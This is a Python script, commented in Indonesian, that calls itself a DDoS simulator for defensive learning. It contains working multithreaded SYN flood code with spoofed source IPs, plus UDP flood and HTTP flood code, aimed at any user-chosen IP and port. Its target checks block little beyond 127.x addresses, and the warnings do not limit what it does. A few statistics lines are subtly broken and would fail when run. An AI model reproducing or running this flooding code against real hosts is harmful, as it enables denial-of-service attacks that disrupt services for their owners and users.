#!/usr/bin/env python3
"""
DDoS Simulator untuk Pembelajaran Defense
⚠️ HANYA UNTUK TESTING SISTEM SENDIRI!
"""

import time
import random
import threading
import socket
import struct
from scapy.all import *
import config
from rich.console import Console
from rich.progress import Progress
from rich.panel import Panel
from rich.text import Text
import pyfiglet

console = Console()

class DDoSSimulator:
    def __init__(self):
        self.target_host = config.SIMULATOR_CONFIG['target_host']
        self.target_port = config.SIMULATOR_CONFIG['target_port']
        self.duration = config.SIMULATOR_CONFIG['attack_duration']
        self.packets_per_second = config.SIMULATOR_CONFIG['packets_per_second']
        self.running = False
        self.attack_stats = {
            'packets_sent': 0,
            'bytes_sent': 0,
            'start_time': 0,
            'attack_types': []
        }
        
        # Target selection
        self.safe_targets = config.SIMULATOR_CONFIG['safe_targets']
        self.enable_target_selection = config.SIMULATOR_CONFIG['enable_target_selection']
        self.enable_port_selection = config.SIMULATOR_CONFIG['enable_port_selection']
        self.common_ports = config.SIMULATOR_CONFIG['common_ports']
    
    def show_banner(self):
        """Menampilkan banner aplikasi"""
        banner = pyfiglet.figlet_format("DDoS SIMULATOR", font="slant")
        console.print(Panel(banner, style="bold red"))
        console.print("[bold yellow]⚠️  PERINGATAN:[/bold yellow] Hanya untuk pembelajaran dan testing defensif!")
        console.print("[bold red]JANGAN PERNAH gunakan untuk menyerang sistem orang lain![/bold red]\n")
    
    def select_target(self):
        """Pilih target IP secara interaktif"""
        console.print("\n[bold cyan]=== PILIH TARGET IP ===[/bold cyan]")
        console.print("[yellow]⚠️  PERINGATAN: Jangan pilih IP yang bisa membuat sistem crash![/yellow]")
        console.print("[yellow]Hindari: localhost (127.0.0.1), IP PC sendiri, atau server penting![/yellow]\n")
        
        # Tampilkan pilihan safe targets
        if self.safe_targets:
            console.print("[bold green]Target yang aman untuk testing:[/bold green]")
            for i, ip in enumerate(self.safe_targets, 1):
                console.print(f"{i}. {ip}")
            console.print(f"{len(self.safe_targets) + 1}. Custom IP (input manual)")
            console.print(f"{len(self.safe_targets) + 2}. Gunakan default ({self.target_host})")
            
            choice = input(f"\nPilihan Anda (1-{len(self.safe_targets) + 2}): ")
            
            try:
                choice_num = int(choice)
                if 1 <= choice_num <= len(self.safe_targets):
                    self.target_host = self.safe_targets[choice_num - 1]
                    console.print(f"[green]✅ Target dipilih: {self.target_host}[/green]")
                elif choice_num == len(self.safe_targets) + 1:
                    self.input_custom_ip()
                elif choice_num == len(self.safe_targets) + 2:
                    console.print(f"[blue]Menggunakan default target: {self.target_host}[/blue]")
                else:
                    console.print("[red]Pilihan tidak valid, menggunakan default[/red]")
            except ValueError:
                console.print("[red]Input tidak valid, menggunakan default[/red]")
        else:
            self.input_custom_ip()
        
        # Konfirmasi target
        console.print(f"\n[bold blue]Target yang akan diserang:[/bold blue] {self.target_host}:{self.target_port}")
        confirm = input("Apakah Anda yakin dengan target ini? (y/N): ")
        if confirm.lower() != 'y':
            console.print("[yellow]Target dibatalkan, kembali ke default[/yellow]")
            self.target_host = config.SIMULATOR_CONFIG['target_host']
    
    def input_custom_ip(self):
        """Input custom IP address"""
        while True:
            custom_ip = input("Masukkan IP target (contoh: 192.168.1.1): ").strip()
            
            # Validasi IP format
            if self.is_valid_ip(custom_ip):
                # Cek apakah IP berbahaya
                if self.is_dangerous_ip(custom_ip):
                    console.print(f"[red]❌ PERINGATAN: IP {custom_ip} berbahaya untuk testing![/red]")
                    console.print("[red]IP ini bisa membuat sistem crash atau merusak jaringan![/red]")
                    continue_choice = input("Apakah Anda tetap ingin melanjutkan? (y/N): ")
                    if continue_choice.lower() != 'y':
                        continue
                
                self.target_host = custom_ip
                console.print(f"[green]✅ Custom IP diset: {custom_ip}[/green]")
                break
            else:
                console.print("[red]❌ Format IP tidak valid! Gunakan format: xxx.xxx.xxx.xxx[/red]")
    
    def is_valid_ip(self, ip):
        """Validasi format IP address"""
        try:
            parts = ip.split('.')
            if len(parts) != 4:
                return False
            for part in parts:
                if not part.isdigit() or not 0 <= int(part) <= 255:
                    return False
            return True
        except:
            return False
    
    def is_dangerous_ip(self, ip):
        """Cek apakah IP berbahaya untuk testing"""
        dangerous_patterns = [
            '127.0.0.1',      # localhost
            '::1',            # IPv6 localhost
            '0.0.0.0',        # all interfaces
            '255.255.255.255', # broadcast
        ]
        
        # Cek localhost ranges
        if ip.startswith('127.'):
            return True
        
        # Cek private network ranges yang bisa berbahaya
        if ip.startswith('10.') or ip.startswith('192.168.') or ip.startswith('172.'):
            # Tanya user untuk konfirmasi
            return False  # Allow dengan warning
        
        return False
    
    def select_port(self):
        """Pilih port target secara interaktif"""
        console.print("\n[bold cyan]=== PILIH PORT TARGET ===[/bold cyan]")
        
        # Tampilkan pilihan port umum
        if self.common_ports:
            console.print("[bold green]Port yang umum untuk testing:[/bold green]")
            for i, port in enumerate(self.common_ports, 1):
                service_name = self.get_service_name(port)
                console.print(f"{i}. Port {port} ({service_name})")
            console.print(f"{len(self.common_ports) + 1}. Custom Port (input manual)")
            console.print(f"{len(self.common_ports) + 2}. Gunakan default ({self.target_port})")
            
            choice = input(f"\nPilihan Anda (1-{len(self.common_ports) + 2}): ")
            
            try:
                choice_num = int(choice)
                if 1 <= choice_num <= len(self.common_ports):
                    self.target_port = self.common_ports[choice_num - 1]
                    service_name = self.get_service_name(self.target_port)
                    console.print(f"[green]✅ Port dipilih: {self.target_port} ({service_name})[/green]")
                elif choice_num == len(self.common_ports) + 1:
                    self.input_custom_port()
                elif choice_num == len(self.common_ports) + 2:
                    console.print(f"[blue]Menggunakan default port: {self.target_port}[/blue]")
                else:
                    console.print("[red]Pilihan tidak valid, menggunakan default[/red]")
            except ValueError:
                console.print("[red]Input tidak valid, menggunakan default[/red]")
        else:
            self.input_custom_port()
    
    def input_custom_port(self):
        """Input custom port"""
        while True:
            try:
                custom_port = input("Masukkan port target (1-65535): ").strip()
                port_num = int(custom_port)
                
                if 1 <= port_num <= 65535:
                    # Cek port yang berbahaya
                    if self.is_dangerous_port(port_num):
                        console.print(f"[red]❌ PERINGATAN: Port {port_num} berbahaya untuk testing![/red]")
                        console.print("[red]Port ini bisa membuat sistem crash atau merusak layanan![/red]")
                        continue_choice = input("Apakah Anda tetap ingin melanjutkan? (y/N): ")
                        if continue_choice.lower() != 'y':
                            continue
                    
                    self.target_port = port_num
                    service_name = self.get_service_name(port_num)
                    console.print(f"[green]✅ Custom port diset: {port_num} ({service_name})[/green]")
                    break
                else:
                    console.print("[red]❌ Port harus antara 1-65535![/red]")
            except ValueError:
                console.print("[red]❌ Port harus berupa angka![/red]")
    
    def is_dangerous_port(self, port):
        """Cek apakah port berbahaya untuk testing"""
        dangerous_ports = [
            22,    # SSH - bisa disconnect user
            23,    # Telnet - bisa disconnect user
            3389,  # RDP - bisa disconnect user
            5900,  # VNC - bisa disconnect user
            22,    # SSH - bisa disconnect user
        ]
        
        return port in dangerous_ports
    
    def get_service_name(self, port):
        """Dapatkan nama service berdasarkan port"""
        service_names = {
            20: 'FTP-DATA', 21: 'FTP', 22: 'SSH', 23: 'TELNET', 25: 'SMTP',
            53: 'DNS', 80: 'HTTP', 110: 'POP3', 143: 'IMAP', 443: 'HTTPS',
            993: 'IMAPS', 995: 'POP3S', 1433: 'MSSQL', 3306: 'MySQL',
            3389: 'RDP', 5432: 'PostgreSQL', 5900: 'VNC', 6379: 'Redis',
            8080: 'HTTP-ALT', 8443: 'HTTPS-ALT', 27017: 'MongoDB'
        }
        
        return service_names.get(port, 'Unknown')
    
    def syn_flood_attack(self):
        """Simulasi SYN Flood Attack"""
        try:
            while self.running:
                # Buat paket SYN dengan source IP yang random
                source_ip = f"{random.randint(1, 254)}.{random.randint(1, 254)}.{random.randint(1, 254)}.{random.randint(1, 254)}"
                source_port = random.randint(1024, 65535)
                
                # Buat paket TCP SYN
                ip_layer = IP(src=source_ip, dst=self.target_host)
                tcp_layer = TCP(sport=source_port, dport=self.target_port, flags="S")
                
                # Kirim paket
                send(ip_layer/tcp_layer, verbose=False)
                
                self.attack_stats['packets_sent'] += 1
                self.attack_stats['bytes_sent'] += 54  # Ukuran paket TCP SYN
                
                time.sleep(1.0 / self.packets_per_second)
        except Exception as e:
            console.print(f"[red]Error dalam SYN Flood: {e}[/red]")
    
    def udp_flood_attack(self):
        """Simulasi UDP Flood Attack"""
        try:
            while self.running:
                # Buat paket UDP dengan data random
                source_ip = f"{random.randint(1, 254)}.{random.randint(1, 254)}.{random.randint(1, 254)}.{random.randint(1, 254)}"
                source_port = random.randint(1024, 65535)
                
                # Data random untuk UDP
                payload = b"X" * random.randint(64, 1024)
                
                # Buat paket UDP
                ip_layer = IP(src=source_ip, dst=self.target_host)
                udp_layer = UDP(sport=source_port, dport=self.target_port)
                
                # Kirim paket
                send(ip_layer/udp_layer/payload, verbose=False)
                
                self.attack_stats['packets_sent'] += 1
                self.attack_stats['bytes_sent'] += len(payload) + 28  # IP + UDP header
                
                time.sleep(1.0 / self.packets_per_second)
        except Exception as e:
            console.print(f"[red]Error dalam UDP Flood: {e}[/red]")
    
    def http_flood_attack(self):
        """Simulasi HTTP Flood Attack"""
        try:
            while self.running:
                # Buat HTTP request dengan User-Agent yang berbeda
                user_agents = [
                    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
                    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
                    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_7_1 like Mac OS X) AppleWebKit/605.1.15"
                ]
                
                # Buat HTTP request
                http_request = f"""GET / HTTP/1.1\r
Host: {self.target_host}\r
User-Agent: {random.choice(user_agents)}\r
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r
Accept-Language: en-US,en;q=0.5\r
Accept-Encoding: gzip, deflate\r
Connection: keep-alive\r
\r
"""
                
                # Kirim HTTP request
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(5)
                    sock.connect((self.target_host, self.target_port))
                    sock.send(http_request.encode())
                    sock.close()
                    
                    self.attack_stats['packets_sent'] += 1
                    self.attack_stats['bytes_sent'] += len(http_request.encode())
                except:
                    pass
                
                time.sleep(1.0 / self.packets_per_second)
        except Exception as e:
            console.print(f"[red]Error dalam HTTP Flood: {e}[/red]")
    
    def start_attack(self, attack_type="mixed"):
        """Memulai simulasi serangan"""
        self.show_banner()
        
        # Target selection jika dienable
        if self.enable_target_selection:
            self.select_target()
        
        # Port selection jika dienable
        if self.enable_port_selection:
            self.select_port()
        
        console.print(f"\n[bold blue]Target:[/bold blue] {self.target_host}:{self.target_port}")
        console.print(f"[bold blue]Durasi:[/bold blue] {self.duration} detik")
        console.print(f"[bold blue]Paket/detik:[/bold blue] {self.packets_per_second}")
        console.print(f"[bold blue]Tipe Serangan:[/bold blue] {attack_type}\n")
        
        # Konfirmasi sebelum memulai
        confirm = input("Apakah Anda yakin ingin memulai simulasi? (y/N): ")
        if confirm.lower() != 'y':
            console.print("[yellow]Simulasi dibatalkan[/yellow]")
            return
        
        self.running = True
        self.attack_stats['start_time'] = time.time()
        
        # Buat thread untuk setiap tipe serangan
        threads = []
        
        if attack_type == "syn" or attack_type == "mixed":
            t1 = threading.Thread(target=self.syn_flood_attack)
            threads.append(t1)
            self.attack_stats['attack_types'].append('SYN Flood')
        
        if attack_type == "udp" or attack_type == "mixed":
            t2 = threading.Thread(target=self.udp_flood_attack)
            threads.append(t2)
            self.attack_stats['attack_types'].append('UDP Flood')
        
        if attack_type == "http" or attack_type == "mixed":
            t3 = threading.Thread(target=self.http_flood_attack)
            threads.append(t3)
            self.attack_stats['attack_types'].append('HTTP Flood')
        
        # Jalankan semua thread
        for thread in threads:
            thread.start()
        
        # Progress bar
        with Progress() as progress:
            task = progress.add_task("[cyan]Simulasi berjalan...", total=self.duration)
            
            while not progress.finished:
                progress.update(task, advance=1)
                time.sleep(1)
                
                # Update stats
                elapsed = time.time() - self.attack_stats['start_time']
                if elapsed > 0:
                    pps = self.attack_stats['packets_sent'] / elapsed
                    bps = self.attack_stats['bytes_sent'] / elapsed
                    
                    progress.console.print(f"[green]Paket terkirim:[/green] {self.attack_stats['packets_sent']}")
                    progress.console.print(f"[green]Bytes terkirim:[/green] {self.attack_stats['bytes_sent']:,}")
                    progress.console.print(f"[green]Paket/detik:[/green] {pps:.2f}")
                    progress.console.print(f"[green]Bytes/detik:[/green] {bps:.2f:,}")
        
        # Stop semua thread
        self.running = False
        for thread in threads:
            thread.join()
        
        self.show_final_stats()
    
    def show_final_stats(self):
        """Menampilkan statistik akhir serangan"""
        console.print("\n[bold green]=== STATISTIK SIMULASI ===[/bold green]")
        console.print(f"[blue]Total Paket:[/blue] {self.attack_stats['packets_sent']:,}")
        console.print(f"[blue]Total Bytes:[/blue] {self.attack_stats['bytes_sent']:,}")
        console.print(f"[blue]Durasi:[/blue] {self.duration} detik")
        console.print(f"[blue]Tipe Serangan:[/blue] {', '.join(self.attack_stats['attack_types'])}")
        
        if self.attack_stats['start_time'] > 0:
            elapsed = time.time() - self.attack_stats['start_time']
            console.print(f"[blue]Waktu Aktual:[/blue] {elapsed:.2f} detik")
            console.print(f"[blue]Rata-rata Paket/detik:[/blue] {self.attack_stats['packets_sent'] / elapsed:.2f}")
            console.print(f"[blue]Rata-rata Bytes/detik:[/blue] {self.attack_stats['bytes_sent'] / elapsed:.2f:,}")
        
        console.print("\n[bold yellow]Simulasi selesai! Sekarang Anda bisa test sistem pertahanan Anda.[/bold yellow]")

def main():
    """Main function"""
    simulator = DDoSSimulator()
    
    console.print("\n[bold cyan]Pilih tipe serangan untuk simulasi:[/bold cyan]")
    console.print("1. SYN Flood Attack")
    console.print("2. UDP Flood Attack") 
    console.print("3. HTTP Flood Attack")
    console.print("4. Mixed Attack (Semua tipe)")
    
    choice = input("\nPilihan Anda (1-4): ")
    
    attack_types = {
        "1": "syn",
        "2": "udp", 
        "3": "http",
        "4": "mixed"
    }
    
    if choice in attack_types:
        simulator.start_attack(attack_types[choice])
    else:
        console.print("[red]Pilihan tidak valid![/red]")

if __name__ == "__main__":
    main()
